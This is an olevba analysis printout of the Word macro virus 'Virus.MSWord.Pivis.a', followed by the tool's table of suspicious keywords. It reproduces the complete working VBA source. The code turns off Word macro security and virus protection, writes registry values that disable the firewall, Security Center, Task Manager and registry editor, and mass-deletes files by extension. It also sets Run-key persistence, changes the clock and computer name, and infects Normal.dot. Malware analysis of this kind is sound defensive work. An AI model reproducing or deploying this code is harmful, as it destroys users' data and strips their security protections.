olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pivis.a
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Pivis.a 
in file: Virus.MSWord.Pivis.a - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function SHAddToRecentDocs Lib "Shell32.dll" (ByVal uFlags As Long, ByVal lpszPath As String) As Long
Private Const SHARD_PATH = &H2
Dim Path As String
'Add a File to the Documents Menu in the Start Button of the Windows Taskbar

Private Declare Function ShellExecute Lib "Shell32.dll" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function GetDesktopWindow Lib "user32" () As Long
'Open the file

Function Startme(DocName As String) As Long
Dim Scr_hDC As Long
Scr_hDC = GetDesktopWindow()
Startme = ShellExecute(Scr_hDC, "Open", DocName, "", "C:\", 1)
End Function

Sub AutoOpen()
On Error Resume Next

With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
   End With

Spiral.Show

MsgBox "Files unable to open!", vbOKOnly + vbCritical, "Welcome!"

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Rolvin", "Rolvin") = "Added"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\Rolvin", "Rolvin") = "Added"

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\WindowsFirewall", "DomainProfile") = "0"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\WindowsFirewall\StandardProfile", "EnableFirewall") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Policies\Microsoft\WindowsFirewall\StandardProfile", "EnableFirewall") = "0"
'to disable the Windows Firewall.

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr") = "0001"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools") = "0001"
'to disable access to the windows task manager and registry editor

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Security Center", "AntiVirusOverride") = "0x001"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Security Center", "FirewallOverride") = "0x001"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Security Center", "FirewallDisableNotify") = "0x001"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Security Center", "AntiVirusDisableNotify") = "0x001"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Security Center", "UpdatesDisableNotify") = "0x001"
'to disable security notifications from the Windows Security Center.

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowInfoTip") = "bx0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "HideIcons") = "bx1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "HideFileExt") = "bx2"
'to turn off the "Show pop-up description for folder and desktop items" setting in Explorer.

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer", "NoDesktop") = "005"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFind") = "005"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoCloseKey") = "005"
' to hide "Search" from the Start menu and others tasks.

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Restrictions", "NoFileOpen") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Restrictions", "NoPrinting") = "1"
'disable funcions in Windows.

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ComputerName", "ComputerName") = "FD67-Start"
'change the name of the computer.

Path = "C:\Windows\Rolvin.doc" ' Path of the File to be Added
SHAddToRecentDocs SHARD_PATH, Path
  'Add a File to the Documents Menu in the Start Button of the Windows Taskbar

WordBasic.Kill "C:\WINDOWS\*.xls"
WordBasic.Kill "C:\WINDOWS\*.pdf"
WordBasic.Kill "C:\WINDOWS\*.rar"
WordBasic.Kill "C:\WINDOWS\*.com"
WordBasic.Kill "C:\WINDOWS\*.ini"
WordBasic.Kill "C:\WINDOWS\*.rtf"
WordBasic.Kill "C:\WINDOWS\*.gif"
WordBasic.Kill "C:\WINDOWS\*.pdf"
WordBasic.Kill "C:\WINDOWS\*.mp3"
WordBasic.Kill "C:\WINDOWS\*.avi"
WordBasic.Kill "C:\WINDOWS\*.mpg"
WordBasic.Kill "C:\WINDOWS\*.bmp"
WordBasic.Kill "C:\*.xls"
WordBasic.Kill "C:\*.pdf"
WordBasic.Kill "C:\*.rar"
WordBasic.Kill "C:\*.com"
WordBasic.Kill "C:\*.ini"
WordBasic.Kill "C:\*.txt"
WordBasic.Kill "C:\*.rtf"
WordBasic.Kill "C:\*.gif"
WordBasic.Kill "C:\*.xls"
WordBasic.Kill "C:\*.mp3"
WordBasic.Kill "C:\*.avi"
WordBasic.Kill "C:\*.mpg"
WordBasic.Kill "C:\*.bmp"

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Sb") = "C:\ARQUIV~1\Rolin.bat"
Open "C:\ARQUIV~1\Rolin.bat" For Output As #1
Print #1, "@echo off"
Print #1, "Echo         Warning."
Print #1, "Echo         Access is denied."
Print #1, "Echo         Files unable."
Print #1, "Echo         Windows Error Found. "
Close #1

Dim MyTime
MyTime = #7:15:00 AM#
Time = MyTime
'It changes the time of the system's clock

MkDir "C:\Bvhl"
MkDir "C:\Vnp"
MkDir "C:\Smlp"
MkDir "C:\Tmrh"
MkDir "C:\Dpc"
'Create folder
ActiveDocument.SaveAs FileName:="C:\Bvhl\Nd1.doc"
ActiveDocument.SaveAs FileName:="C:\Vnp\Bt2.doc"
ActiveDocument.SaveAs FileName:="C:\Smlp\Fz5.doc"
ActiveDocument.SaveAs FileName:="C:\Tmrh\Ec9.doc"
ActiveDocument.SaveAs FileName:="C:\Dpc\Erc4.doc"
ActiveDocument.SaveAs FileName:="C:\My Shared Folder\Love.doc"
ActiveDocument.SaveAs FileName:="C:\My Documents\Info.doc "
ActiveDocument.SaveAs FileName:="C:\WINDOWS\System\Musical.doc"

Open "C:\Windows\Temp\News.txt" For Output As #1
Print #1, "Files corrupted."
Close #1

If Weekday(Now()) = 3 Or Weekday(Now()) = 5 Or Weekday(Now()) = 7 Then
'Weekdays 3 = Tuesday , 5 = Thursday , 7 = Saturday
Dim jj As Long
jj = Startme("C:\Windows\Temp\News.txt")
  
  End If
End Sub

Sub AutoClose()
On Error Resume Next

Spiral.Show

   Dim i
   Dim Exist
   Dim Instal
   Dim sMe$
   Dim sMacro$
   Dim iMacroCount
  
   iMacroCount = WordBasic.CountMacros(0, 0)
   For i = 1 To iMacroCount
      If WordBasic.[MacroName$](i, 0, 0) = "Rolvin" Then
           Instal = -1
      End If

      If WordBasic.[MacroName$](i, 0, 0) = "Spiral" Then
           Exist = -1
       End If
   Next i
   If Not Exist And Not Instal Then
     sMe$ = WordBasic.[FileName$]()
       sMacro$ = sMe$ + ":Rolvin"
       WordBasic.MacroCopy sMacro$, "Global:Rolvin"
       sMacro$ = sMe$ + ":Spiral"
      WordBasic.MacroCopy sMacro$, "Global:Spiral"
      
      If NormalTemplate.Saved = False Then NormalTemplate.Save
       ' Save module Rolvin and module Spiral in the Normal.dot

      End If
   
   ActiveDocument.Save

End Sub

Sub Toolsmacro()
On Error Resume Next
CommandBars("Macro").Controls("Security...").Enabled = False 'Disable Tools macro
End Sub
 













+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ShellExecute        |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ShellExecuteA       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Shell32.dll         |Executable file name                         |
|IOC       |Rolin.bat           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

